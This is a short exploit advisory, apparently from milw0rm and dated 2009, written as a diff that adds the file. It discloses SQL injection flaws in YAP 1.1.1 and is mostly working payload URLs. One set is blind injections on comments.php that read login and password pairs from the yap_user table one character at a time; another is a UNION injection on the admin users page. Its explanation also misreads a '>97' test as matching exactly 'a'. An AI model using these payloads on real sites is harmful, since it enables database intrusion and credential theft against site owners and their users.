@@ -1,0 +1,34 @@
+#######################################################################################################
+[+] YAP 1.1.1 Blind SQL Injection/SQL Injection
+[+] Discovered By SirGod
+[+] www.mortal-team.org
+[+] www.h4cky0u.org
+########################################################################################################
+
+[+] Blind SQL Injection
+
+  The default prefix for database tables is "yap_" .But can be changed
+at installation.
+
+ PoC :
+
+     http://127.0.0.1/[path]/comments.php?image_id=1 and ascii(substring((SELECT concat(login,0x3a,pass) from yap_user limit 0,1),1,1))>97
+
+   First character of the username is char(97) , is "a" .
+
+     http://127.0.0.1/[path]/comments.php?image_id=1 and ascii(substring((SELECT concat(login,0x3a,pass) from yap_user limit 0,1),2,1))>100
+
+   Second character of the username is char(100) ,is "d" .
+
+ And so on...Change the limit to go to the next char.
+
+
+[+] SQL Injection
+
+ - Need to be logged in as administrator.
+
+    http://127.0.0.1/[path]/admin/index.php?page=users_modif&action=modif&user=null union all select concat_ws(0x3a,login,pass),2 from yap_user where id=1--
+
+#########################################################################################################
+
+# milw0rm.com [2009-03-16]
